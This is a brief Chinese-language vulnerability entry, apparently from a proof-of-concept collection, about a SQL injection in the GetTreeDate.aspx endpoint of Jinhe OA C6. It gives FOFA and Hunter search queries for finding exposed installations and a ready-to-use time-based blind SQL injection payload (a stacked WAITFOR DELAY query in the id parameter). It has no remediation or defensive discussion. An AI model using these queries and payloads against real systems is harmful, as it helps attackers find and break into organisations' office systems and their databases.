# 金和OA C6 GetTreeDate.aspx SQL注入漏洞

## 网络测绘

fofa: app="金和网络-金和OA" && body="/c6/"

hunter: app.name="金和 OA" and web.body="/c6/"

## POC / EXP

```
/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1

/C6/Jhsoft.Web.users/GetTreeDate.aspx/?id=1%3bWAITFOR+DELAY+'0%3a0%3a5'+--%20and%201=1
```